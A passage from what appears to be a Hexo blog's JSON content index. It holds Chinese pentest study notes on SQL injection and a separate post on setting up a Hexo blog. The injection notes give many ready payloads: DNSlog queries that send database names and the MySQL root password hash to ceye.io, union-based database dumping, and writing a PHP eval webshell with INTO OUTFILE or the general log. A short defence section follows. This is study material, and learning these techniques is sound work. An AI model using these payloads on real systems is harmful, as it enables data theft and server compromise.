比如某登录场景：index.php?id=1$name=admin$pwd=123。账号密码中带有=号和&amp;号，就可能导致冲突，这些就需要进行url编码 比如： 编码前：name=admin= 编码后：name=admin%3d 通常后端程序会自动进行解码，比如php的urldecode()函数：urldecode('%3d') 二次编码 urldecode()与PHP本身处理编码时，两者配合失误，可以构造数据消灭斜线。 当输入id=1%27或者id=1’，都会被过滤（加上了\\） 当输入id=1%2527就可以让%25--&gt;%，所以合起来，就会变成%27，刚好能够注入。 二阶注入（二次注入） 示例是由：创建用户，登录和修改密码组成。 当我们遇到特殊字符转义的时候（例如：mysql_real_escape_string） mysql_real_escape_string: 将转义特殊字符：\\x00, \\n, \\r, \\, ', &quot;, \\x1a 当我们注册的用户名为admin'#，即使转义了，但是在数据库中是存在的，可以直接调出来，修改密码的地方并没有过滤，那么我们可以进行二次注入。 $sql = &quot;UPDATE users SET PASSWORD='$pass' where username='admin '#' and password='$curr_pass'&quot;; 好文章，待会看： ZZCMS v8.3二阶注入：https://www.freebuf.com/vuls/183360.html ZoneMinder：https://www.4hou.com/info/news/19267.html Joomla3.8.2：https://blog.csdn.net/publicStr/article/details/80261667 二次注入漏洞挖掘：https://www.secpulse.com/archives/76506.html 二阶注入研究论文：http://www.doc88.com/p-6931153563831.html DNS注入（盲注DNSlog外带） 原理：首先需要有一个可以配置的域名，比如：ceye.io，然后通过代理商设置域名 ceye.io 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，这样以来所有 ceye.io 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了，图示如下 原理 DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。 利用场景：在sql注入时为布尔盲注、时间盲注，注入的效率低且线程高容易被waf拦截，又或者是目标站点没有回显，我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功，且在现代WAF的防护下，很可能导致IP被ban，这时候就要用到我们的DNSlog注入。 推荐平台：dnslog, admindnslog, ceye, BulidDNS 攻击 目标使用Mysql：SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\\\abc')); 前人的payload： ?id=1’ and if((select load_file(concat(’\\\\\\\\’,(select database()),’.sojcvo.ceye.io\\\\aaa’))),1,0)--+ ?id=1' and if((select load_file(concat('\\\\\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.sojcvo.ceye.io\\\\aaa'))),1,0)--+ ?id=1' and if((select load_file(concat('\\\\\\\\',(select hex(concat_ws('~',username,password)) from users limit 0,1),'.sojcvo.ceye.io\\\\abc'))),1,0)-- + 用 concat_ws() 函数分割，因为在 load_file() 里面不能使用 @ ~ 等符号分割，用 hex() 函数转成十六进制，出来结果了再转回去即可。 然后在ceye.io中看输出。 各位置注入 提交方式：get/post get只有一次传输 post传输头得到100 continue后再传data 注入类型：json/数字/字符串 注入点： Cookie Header：User-Agent（）可能存在有数据库的交互，记录在$_SERVER中","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入进阶-各种数据库的注入方式","slug":"SQL注入进阶-各种数据库的注入方式","date":"2023-05-23T10:24:39.000Z","updated":"2023-05-25T01:15:16.457Z","comments":true,"path":"articles/2023/05/23/SQL注入进阶-各种数据库的注入方式/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/","excerpt":"","text":"介绍 什么决定网站注入点用户权限？数据库配置文件 常用数据库 常见的数据库：Access，Mysql，Mssql，mongoDB，postgresql，sqlite，oracle，sybase等 这些数据库除了Access没有数据库名外，其他都类似，有：数据库名+表名+列名+数据 关系型数据库：通过外键关联来建立表与表之间的关系。由二维表及其之间的联系组成的一个数据组织。如：Oracle、DB2、MySql 非关系型数据库：通常指数据以对象的形式存储在数据库中，而对象之间的关系通过每个对象自身的属性来决定。非关系型数据库产品是传统关系型数据库的功能阉割版本，通过减少用不到或很少用的功能，来大幅度提高产品性能。如：NoSql、Cloudant。 判断sql注入数据库类型方法 如果可以，直接通过端口/默认语言判断 默认语言搭配数据库： 组合类型asp + access/mssql 组合类型php + mysql 组合类型aspx+mssql 组合类型jsp +mysql/oracle 组合类型Python + MongoDB 常见数据库的默认端口： 关系型数据库 mysql 3306 sqlserver 1433 oracle 1521 psotgresql 5432 非关系型数据库 MongoDB 27017 Redis 6379 memcached 11211 是否可以使用特定的函数来判断，该数据库特有的 在mssql中可以调用substring。oracle则只可调用substr mssql不可以调用version() 是否可以使用辅助的符号来判断，如注释符号、多语句查询符等等 /*是MySQL中的注释符，返回错误说明该注入点不是MySQL； --是Oracle和MSSQL都支持的，但是;是Oracle不支持的，因为它不支持多行查询。 是否可以编码查询 是否显可以利用错误信息 例如：错误提示Microsoft JET Database Engine 错误 ‘80040e14’，说明是通过JET引擎连接数据库，则表明数据库为ACCESS数据库，如果是ODBC的话则说明是MSSQL数据库。 是否存在数据库某些特性辅助判断 特殊表：access(msysobjects)，mssql(sysobjects)，oracle(sys.user_tables)，mysql(information_schema) 参考：https://www.jianshu.com/p/e308d96e2ecd MYSQL 常见手法 找到注入点 and 1=1 and 1=2 测试报错 order by 5 # 到5的时候报错，获取字段总数为4 id=0(不是1就行，强行报错) union select 1,2,3,4 # 联合查询，2和3可以显示信息 获取数据库信息 123user() ==&gt;rootdatabase() ==&gt;mozhe_Discuz_StormGroupversion() ==&gt;5.7.22-0ubuntu0.16.04.1 获取数据库表 12345table_name 表名information_schema.tables 系统生成信息表table_schema=数据库名16进制或者用单引号括起来# 改变limit 0,1中前一个参数，得到其他表 获取列名 脱库 信息搜集（前面提过） 在mysql的5.0以上版本中，自带一个information_schema数据库名，存储数据库所有的信息，具有表schemata（数据库名）tables（表名）columns（列名字段名） 1234SCHEMA_NAME字段用来存储数据库名，TABLE_SCHEMA字段用来存储表名，table_schema和table_name分别来存储数据库名和表名information_schema.tables 记录所有的表information_schema.columns 记录所有的列 MYSQL注入中首先要明确当前注入点权限，高权限注入时有更多的攻击手法，有的能直接进行getshell操作，其中也会遇到很多的阻碍，相关防御手法也要明确，所谓知己知彼，百战不殆。作为安全开发工作者，攻防兼备。 注入点权限是否为root，取决于连接数据库的文件。这也决定了高权限注入及低权限注入。使用user()进行查看，而且需要注意的是：不是root权限获取不到数据库名。 跨库查询、文件读写以及应用思路 跨库查询 1234567891011# 获取所有数据库名?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata # 查表，找与网站对应的数据库名，若没有，则挨个查。或者使用 union select 1,2,database()?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = &#x27;qqyw&#x27;# 跨库查列?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = &#x27;admin&#x27; and table_schema=&#x27;qqyw&#x27;# 查结果?id=-1 union select 1,u,p from qqyw.admin 文件读写 会用到MySQL数据库里两个内置函数，这两个函数是MySQL数据库特有的，在其他数据库是没有的或者在其他数据库中写法不同，所以这是为什么说注入点分数据库的原因，因为每个数据库内置的安全机制和它的功能不同，这才导致在注入的时候针对不用的数据库采取的攻击思路也不同。MySQL有内置读取的操作函数，我们可以调用这个函数作为注入的攻击。 读取函数：load_file() 导出函数：into outfile 或into dumpfile 前提 应该设置--secure-file-priv 否则会出现如下错误，这是因为MySQL 限制了数据的导出路径。MySQL 导入导出文件只能在secure-file-priv变量的指定路径下的文件才可以导入导出。如果是NULL那就是禁止输出。而如果是空，则不限制目录。 The MySQL server is running with the --secure-file-priv option so it cannot execute this statement。 应该对web目录需要有写权限，能够使用单引号 应该知道绝对路径 读取数据库路径：@@datadir 文件读取 只能读取绝对路径的网页文件 读取数据库路径：@@datadir 将绝对路径转换为16进制数时，不需要使用引号 语句： 1and 1=2 union select 1,load_file(&#x27;C:\\\\inetpub\\\\wwwroot\\\\mysql-sql\\\\inc\\\\set_sql.php&#x27;),3,4 然后在网页源码中查看 文件导出（写入到文件） 知道路径： 1?id=1 union select &quot;&lt;?php @eval($_POST[&#x27;123&#x27;]);?&gt;&quot; into outfile(&quot;C:/phpStudy/WWW/a.php&quot; 采用PHPmyadmin，选择一个数据库如test，在数据库中新创建一个表aa，在aa中插入一个数据&lt;?php @eval($_POST['123']);?&gt; 1id=-1 union select * from aa into outfile &#x27;C:/phpStudy/WWW/a.php&#x27;; --+ 路径获取常见方法 报错显示：一般网站出现错误的时候它会泄露出路径； 遗留文件：站长为了调试信息的时候遗留的文件而泄露的路径。用扫描工具可以扫出； 漏洞报错：知道对方是用什么程序搭建再去网上去搜索漏洞信息：phpcms 爆路径； 平台配置文件：通过读取文件来读取搭建网站平台的配置文件。缺点：路径不是默认的，一旦更改很难找到路径； 爆破； 魔术引号及常见保护 php.ini中存在magic_quotes_gpc选项，称为魔术引号，此选项打开，使用GET，POST，cookie所接收的'单引号，&quot;双引号，\\反斜线和NULL字符全部被加上一个反斜线转义。此时，注入类型是字符型注入已经无法构成威胁。 编码或宽字节绕过 isset无法绕过，则替换关键字 宽字节绕过0XBF27是两个字符，在PHP中比如addslash和magic_quotes_gpc开启时，由于会对0x27单引号进行转义，因此0xbf27会变成0xbf5c27，而数据进入数据库中时，由于0XBF5C是一个另外的字符，因此\\转义符号会被前面的bf带着&quot;吃掉&quot;，单引号由此逃逸出来可以用来闭合语句 自定义关键字替换 其他绕过思路见其他文章 权限获取 数据库操作权限获取 提权之前需要获得高权限用户，获得高权限Mysql用户可以通过以下方法： 弱口令爆破 sqlmap注入的--sql-shell模式 进入交互界面后，通过select host,user,password from mysql.user这条命令，可以查询数据库的用户和密码。 网站的数据库配置文件中拿到明文密码信息。文件名一般都有config CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限 Webshell获取 into outfile 知道网站物理路径 高权限数据库用户 load_file()开启 即 secure_file_priv 无限制 可以通过这个查：mysql&gt; show global variables like '%secure_file_priv%'; 值 说明 NULL 不允许导入或导出 /tmp 只允许在/tmp操作 空 不限制目录 在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件 在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件 网站路径有写入权限 操作 select &#x27;&lt;?php phpinfo(); ?&gt;&#x27; into outfile &#x27;/var/www/html/info.php&#x27;; 1232. ``` sqlmap -u &quot;http://x.x.x.x/?id=x&quot; --file-write=&quot;/Users/guang/Desktop/shell.php&quot; --file-dest=&quot;/var/www/html/test/shell.php&quot; 日志文件写 shell Web 文件夹宽松权限可以写入 Windows 系统下 高权限运行 MySQL 或者 Apache 日志设置查看： 12345678mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;general_loggeneral_log_file# 自定义set global general_log = &quot;ON&quot;;set global general_log_file=&#x27;/var/www/html/info.php&#x27;;# 往日志里面写入 payloadselect &#x27;&lt;?php phpinfo();?&gt;&#x27;; MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell general_log 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。 可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell： 注： 这里虽然可以成功写入，但是这个 info.php 是 MySQL 创建的 ： Apache 访问这个 php 文件会出现 HTTP 500 的状态码，结论是 root 系统这种情况基本上不会成功，只有在 Windows 系统下成功率会高一些 系统命令执行（提权【参考国光】） 查询HASH解密 1234# MySQL &lt;= 5.6 版本mysql&gt; select host, user, password from mysql.user;# MySQL &gt;= 5.7 版本mysql &gt; select host,user,authentication_string from mysql.user; 也可以通过 Hashcat 来手动跑字典，基本上使用 GPU 破解的话也是可以秒破解的： UDF提权 反弹端口提权 MOF提权 启动项提权 CVE-2016-6663/6664组合拳 低版本注入配合读取或暴力 小于5.0版本 字典或读取，爆破 ACCESS access数据库保存在网站源码下面，自己网站数据库独立存在，没有文件读写的操作。 面对它只能暴力猜解，没有其他办法。 Access注入时，如果列名或者表名猜解不到的情况怎么办？ Access偏移注入：解决列名获取不到的情况。 and 1=2 报错找到注入点 order by 获取总字段 猜解表名 and exists (select * from admin) 页面返回正常，说明存在admin表 猜解列名 and exists(select id from admin) 页面显示正常，admin表中存在id列 username,passwd 同样存在 脱库 union select 1,username,passwd,4 from admin MSSQL and 1=2报错 order by N# 获取总字段 猜表名 and exists(select * from manage) 表名manage存在 猜解列名and exists(select id from manage)列名id存在 脱库and exists (select id from manage where id=1 )证明id=1存在 and exists (select id from manage where%20 len(username)=8 and id=1 ) 猜解username字段长度为8 and exists (select id from manage where%20 len(password)=16 and id=1 ) 猜解password字段长度为16 可用Burp的Intruder功能辅助猜解 猜解username第1到8位的字符，ASCII转码 admin_mz 猜解password第1到16位的字符，ASCII转码(Burp 爆破) 转ASCII的py脚本： 72e1bfc3f01b7583 MD5解密为97285101 常用参数 @@version，查询当前数据库版本 db_name()，查询当前数据库名称 user,system_user,current_user,user_name，查询当前用户 IS_SRVROLEMEMBER()，查询数据库权限。 @@SERVERNAME：获取有关服务器主机的信息 SQLite 找注入点 and 1=1 order by N 猜字段 4 猜数据库 offset ==&gt;0~2 有三个数据库： WSTMart_reg notice_sybase sqlite_sequence 猜列 共有3个字段： id,name,password 脱库 MongoDB id=1′ 单引号注入报错 闭合语句，查看所有集合 查看指定集合的数据 [0] 代表第一条数据，可递增 DB2 and 1=2 判断注入点 order by N 获取字段数 爆当前数据库：GAME_CHARACTER 列表：NAME 脱库 PostgreSQL and 1=2 判断注入点 order by N 获取字段 爆数据库 列表 列字段 脱库 Sybase数据库 and 1=2 判断注入点 order by N 获取总字段 爆数据库 列表 列字段 查状态：结果为：zhang 反选爆用户名：结果为：mozhe 猜解密码 Oracle and 1=1 order by 爆数据库 列表 列字段 脱库 加上状态：1 where STATUS=1 其他 小tips outfile 和 dumpfile的区别 outfile: 支持多行数据同时导出 使用union联合查询时，要保证两侧查询的列数相同 会在换行符制表符后面追加反斜杠 会在末尾追加换行 dumpfile: 每次只能导出一行数据 不会在换行符制表符后面追加反斜杠 不会在末尾追加换行 因此，我们可以使用into dumpfile这个函数来顺利写入二进制文件；into outfile函数也可以写入二进制文件，只是追加的反斜杠会使二进制文件无法生效。如果服务器端本身的查询语句，结果有多行，但是我们又想使用dump file，应该手动添加 limit 限制。","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入基础","slug":"SQL注入基础","date":"2023-05-23T02:29:45.000Z","updated":"2023-05-25T01:14:36.391Z","comments":true,"path":"articles/2023/05/23/SQL注入基础/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","excerpt":"","text":"SQL注入基础 基础语法以及函数 基础 12345678910# 查询select * from news where id=$id# 更新update user set pwd=’$p’ where id=2 and username=‘admin’# 添加insert into users(id,url,text) values(2,‘x’,’$t’)# 删除delete from news where id=$id# order byselect id,name,price from news order by $order 其他 123456# 增加字段ALTER TABLE employees ADD phone varchar(20)# 权限控制(grant revoke)grant insert on grant_rights to unauthorized_user# 删表DROP TABLE users; 连接词、联合查询 **union：**联合查询 1select * from table where id = 1 union order by 3 join：连接查询（right/left join），如下搜索两个表相同的字段 1select * from users a join users b where a.id = b.id 注释以及其他符号 注释： 1234/* */ are inline comments-- , # are line commentsExample: SELECT * FROM users WHERE name = &#x27;admin&#x27; -- AND pass = &#x27;pass&#x27; 对于# url中的#是用来指导浏览器动作的（例如锚点），对服务端完全无用 所以在URL中使用#进行注入时应该将它转成url编码：%23 在POST请求中就不需要（需要验证） 对于--(空格) 一般在GET请求中，空格会直接被忽略，所以需要把他转化成--%20 还有另外一种方式，就是使用--+，这时候+号会被解释成空格 为什么要加空格：因为这样可以和后面的单引号隔开，才能形成有效的payload 对于需要编码转码的#有用，因为只有一个字符，POST最好用这个，其他用--+ 堆叠查询： 123; allows query chainingExample: SELECT * FROM users; DROP TABLE users; 查询可用： 1234&#x27;,+,|| allows string concatenationChar() strings without quotesExample: SELECT * FROM users WHERE name = &#x27;+char(27) OR 1=1 注入原理以及危害 对于传入的搜索内容过滤不严，导致用户可以通过拼接SQL语句，对数据库进行操作。 以下情形均可能产生漏洞： 接收数据 拼接数据 数据库执行 结果展示 他会导致如下危害： 危害数据库里的数据 直接危害网站的权限 我们可以通过以上查询方式与网站应用的关系，注入点产生地方或应用猜测到对方的 SQL 查询方式 基本注入 这里以mysql注入为例子 信息搜集 主要搜集： 123456789# 操作系统select @@version_compile_os# 数据库版本：select version()select @@version# 数据库名字：select database()# 数据库用户：select user() 在mysql的5.0以上版本中，自带一个information_schema数据库名，存储数据库所有的信息，具有表schemata（数据库名）tables（表名）columns（列名字段名） 1234SCHEMA_NAME字段用来存储数据库名，TABLE_SCHEMA字段用来存储表名，table_schema和table_name分别来存储数据库名和表名information_schema.tables 记录所有的表information_schema.columns 记录所有的列 小知识点： 问：一个@与两个@@有何区别？ 答：一个@是用户自定义变量，两个@是系统变量 手工注入 判断是否能注入，以及注入类型 先看是否输出信息：可以使用'、&quot; 和--+来测试 输出正确、错误与报错信息：都可以 输出正确、报错但不输出错误信息：布尔/时间盲注/报错注入 输出正确但不输出报错和错误信息：布尔/时间盲注 不输出任何信息：时间盲注 12# 或 且 非 三种逻辑判断符id=-1&#x27; and 1=1 判断有几个注入点：id=1' order by 3--+ 判断输出点有几个是可以回显的：id=1' union select 1,2,3 --+ 信息搜集： 获取数据库: 获取此时的数据库：id=-1' union select 1,2,database() --+ 获取全部数据库：id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata --+ 获取表名:id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+ 查询其他数据库表名把database()换成'you_want' 获取列名：id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='you_want --+' 数据获取： 获取单个：id=-1' union select 1,2,[columnname] from [tablename] --+' 获取全部： id=-1' union select 1,2,group_concat([allcolumnname]) from [tablename]--+ -1' union select 1,2,(select concat_ws([column_name]) from [tbname]) --+ 闭合 常用闭合 1234567or 1=1--+ （数字型）&#x27; or 1=1--+ （字符型）&quot; or 1=1--+ （字符型）) or 1=1--+ （MySQL是允许嵌入多个括号的）&#x27;) or 1=1--+&quot;) or 1=1--+&quot;)) or 1=1--+ 非注释闭合 1234|| &#x27;or &#x27;&amp;&amp; &#x27;1&#x27;=&#x27;1;%00 报错and盲注 盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类： 基于布尔的 SQL 盲注-逻辑判断：regexp，like，ascii，left，ord，mid 基于时间的 SQL 盲注-延时判断：if，sleep 基于报错的 SQL 盲注-报错回显：floor，updatexml，extractvalue 对于报错注入，其payload可以安排在如下位置： 1234567&#x27;or（有效载荷）or&#x27;&#x27;and（有效载荷）and&#x27;&#x27;or（有效载荷）and&#x27;&#x27;or（有效载荷）and&#x27;=&#x27;&#x27;*（有效载荷）*&#x27;&#x27;or（有效载荷）and&#x27;“ - （有效载荷） - “ 参考： 123456789like ‘ro%’ #判断ro或ro…是否成立regexp ‘^xiaodi[1-z]’ #匹配xiaodi及xiaodi…等if(条件,5,0) #条件成立，返回5，反之，返回0sleep(5) #SQL语句延时执行5秒mid(a,b,c) #从位置b开始，截取a字符串的c位substr(a,b,c) #从B位置开始，截取字符串a的c长度left(database(),1),database() #left(a,b)从左侧截取a的前b位length(database())=8 #判断数据库database()名的长度ord=ascii ascii(x)=97 #判断x的ascii码是否等于97 涉及资源： 12种报错注入+万能语句 Order by排序注入方法小总结 Insert update 语句：insert into user(username,password) values('$username','$password',) floor：username=lwx’ or(select 1 from(select count(*),concat((select(select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or ' updatexml：username=lwx’ or updatexml(1,concat(0x7e,(version())),0) or ' extractvalue：username=lwx’ or extractvalue(1,concat(0x7e,database())) or ' delete 在get中需要使用+号或者%20把语句连接起来，避免出错 floor：GET /pikachu-master/vul/sqli/sqli_del.php?id=57+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a) HTTP/1.1 updatexml：GET /pikachu-master/vul/sqli/sqli_del.php?id=57+or+updatexml+(1,concat(0x7e,database()),0) extractvalue：GET /pikachu-master/vul/sqli/sqli_del.php?id=57+or+extractvalue(1,concat(0x7e,database())) HTTP/1.1 布尔与延时盲注 布尔盲注 id=1' and left(version(),1)=5 --+ id=1' and length(database())=8--+ 延时盲注 id=1 and if((length(database()=8)),sleep(5),1)--+ id=1 and if(ascii(substr(database(),1,1))=115,sleep(5),1) --+ 防御SQL注入 需要分清各种防御针对的对象是谁。 SQL语句的执行代码使用预编译 PreparedStatement 。 确定每个数据的类型，比如是数字，数据库则必须使用int类型来存储。(这个是用来防什么的？) 限制传入数据的长度，这能够在一定程度上防止sql注入。 严格限制用户使用数据库的权限，能够在一定程度上减少sql注入的危害。 避免直接响应一些 sql 语句执行异常的信息。 过滤参数中含有的一些数据库关键词。 其他 基础概念 实例名：数据库实例名是用于和操作系统进行联系的标识,就是说数据库和操作系统之间的交互用的是数据库实例名 待补充…","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"HEXO博客的搭建","slug":"HEXO博客的搭建","date":"2023-05-22T12:03:26.000Z","updated":"2023-06-06T13:37:15.000Z","comments":true,"path":"articles/2023/05/22/HEXO博客的搭建/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/22/HEXO%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/","excerpt":"","text":"安装HEXO和相关插件 hexo的安装 先安装node.js，地址：https://nodejs.org/en 安装完后安装Hexo： 1npm install hexo-cli -g 配置腾讯云节点： 12npm config set registry http://mirrors.cloud.tencent.com/npm/npm config get registry # 如果返回http://mirrors.cloud.tencent.com/npm/，说明镜像配置成功。 主题Pure以及配置 主题：https://github.com/cofess/hexo-theme-pure 先初始化一个文件夹，例如Blog： 1hexo init Blog 加载主题： 1git clone https://github.com/cofess/hexo-theme-pure.git themes/pure 更新主题： 12cd themes/puregit pull 配置（需要配置根目录config）：参考1，参考2，参考3，参考4 12language: zh-CN # 中文... 写文章 参考，没啥要讲的，指令：hexo n &quot;title&quot;，即可。 模板 模板在目录scaffolds里面，一般新建文件都会附上他的头，推荐头： 12345678title: HEXO博客的搭建toc: truesidebar: nonedate: 2023-05-22 20:03:26tags: [博客搭建]categories: [杂]descriptions: 本文介绍hexo搭建博客的心路历程typora-root-url: ..\\..\\.. 上面的typora-root-url很重要！下面说到。 设置分类 由于post文件夹里面的文章太多不好管理，那么只要我们分类一下即可。参考 配置： 12permalink: &#x27;articles/:year/:month/:day/:name/&#x27;new_post_name: &#x27;:year/:month/:title.md&#x27; Hexo与Typora协同 先设置一下图片目录：优先相对路径，自己设置，然后在文件头上蛇者上面的玩意。 解释：也就是，typora会将图片自动加载到一个文件夹里（它自己设置的），后面我们只需要设置根目录typora-root-url，让hexo能链接到即可！ 参考 404转发 https://hexo-next.readthedocs.io/zh_CN/latest/hexo/advanced/404页面/ 设置更新时间 更新E:\\Blog\\themes\\pure中的_config.yml，添加： display_updated: true 在E:\\Blog\\themes\\pure\\layout\\_partial\\post添加文件updated.ejs 123456&lt;span class=&quot;article-updated&quot;&gt; &lt;i class=&quot;icon icon-calendar-check&quot;&gt;更新于&lt;/i&gt; &lt;a href=&quot;&lt;%- url_for(post.path) %&gt;&quot; class=&quot;&lt;%= class_name %&gt;&quot;&gt; &lt;time datetime=&quot;&lt;%= date_xml(post.updated) %&gt;&quot; itemprop=&quot;datePublished&quot;&gt;&lt;%= date(post.updated, date_format) %&gt;&lt;/time&gt; &lt;/a&gt;&lt;/span&gt; 在E:\\Blog\\themes\\pure\\layout\\_partial\\post，更新文件date.ejs 123456&lt;span class=&quot;article-date&quot;&gt; &lt;i class=&quot;icon icon-calendar-check&quot;&gt;创建于&lt;/i&gt; &lt;a href=&quot;&lt;%- url_for(post.path) %&gt;&quot; class=&quot;&lt;%= class_name %&gt;&quot;&gt; &lt;time datetime=&quot;&lt;%= date_xml(post.date) %&gt;&quot; itemprop=&quot;datePublished&quot;&gt;&lt;%= date(post.date, date_format) %&gt;&lt;/time&gt; &lt;/a&gt;&lt;/span&gt; 在E:\\Blog\\themes\\pure\\layout\\_partial中的article.ejs的第9行后，添加一段： 1&lt;%- partial(&#x27;post/updated&#x27;, &#123;class_name: &#x27;article-updated&#x27;, date_format: null&#125;) %&gt; 完成 常用指令 123456hexo cleanhexo ghexo d # 推送 或者一起：hugo g -dhexo s # 本地测试hexo n &#x27;title&#x27; 推送hexo d 安装npm install hexo-deployer-git --save 然后配置： 12345deploy: type: git repo: &lt;repository url&gt; #https://bitbucket.org/JohnSmith/johnsmith.bitbucket.io branch: [branch] message: [message] 参考：https://hexo.io/zh-cn/docs/one-command-deployment.html 一些问题 Spawn failed https://blog.csdn.net/Kevin_Carpricron/article/details/124069885 组件推荐 文章加密 https://blog.51cto.com/u_15719567/5476056 代码块魔改 http://blog.iwwee.com/posts/hexo-optimize.html 关于复制代码的那一块参考下面的： https://kangaroohy.com/tools/hexo-theme-pure-optimize.html 评论系统开启 https://valine.js.org/quickstart.html Markdown标题头 https://www.npmjs.com/package/hexo-heading-index 博客优化 npm install hexo-neat --save https://github.com/cofess/hexo-theme-pure/blob/master/README.cn.md 优秀的搭建站点 https://hwame.top/20200520/hello-hexo-configuration.html https://tianbiao.top/29-pure主题配置/index.html 效果","categories":[{"name":"杂","slug":"杂","permalink":"https://j3f5.github.io/categories/%E6%9D%82/"}],"tags":[{"name":"博客搭建","slug":"博客搭建","permalink":"https://j3f5.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]}],"categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"打靶","slug":"渗透测试/打靶","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%89%93%E9%9D%B6/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://j3f5.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"},{"name":"车联网基础","slug":"车联网基础","permalink":"https://j3f5.github.io/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80/"},{"name":"开发基础","slug":"开发基础","permalink":"https://j3f5.github.io/categories/%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/"},{"name":"JAVA安全基础","slug":"JAVA安全基础","permalink":"https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"渗透测试基础","slug":"JAVA安全基础/渗透测试基础","permalink":"https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"},{"name":"杂","slug":"杂","permalink":"https://j3f5.github.io/categories/%E6%9D%82/"}],"tags":[{"name":"权限提升","slug":"权限提升","permalink":"https://j3f5.github.io/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"},{"name":"漏洞扫描","slug":"漏洞扫描","permalink":"https://j3f5.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"},{"name":"内网","slug":"内网","permalink":"https://j3f5.github.io/tags/%E5%86%85%E7%BD%91/"},{"name":"CAN","slug":"CAN","permalink":"https://j3f5.github.io/tags/CAN/"},{"name":"诊断","slug":"诊断","permalink":"https://j3f5.github.io/tags/%E8%AF%8A%E6%96%AD/"},{"name":"整体流程","slug":"整体流程","permalink":"https://j3f5.github.io/tags/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/"},{"name":"提权","slug":"提权","permalink":"https://j3f5.github.io/tags/%E6%8F%90%E6%9D%83/"},{"name":"渗透技巧","slug":"渗透技巧","permalink":"https://j3f5.github.io/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"},{"name":"waf绕过","slug":"waf绕过","permalink":"https://j3f5.github.io/tags/waf%E7%BB%95%E8%BF%87/"},{"name":"协议","slug":"协议","permalink":"https://j3f5.github.io/tags/%E5%8D%8F%E8%AE%AE/"},{"name":"漏洞发现","slug":"漏洞发现","permalink":"https://j3f5.github.io/tags/%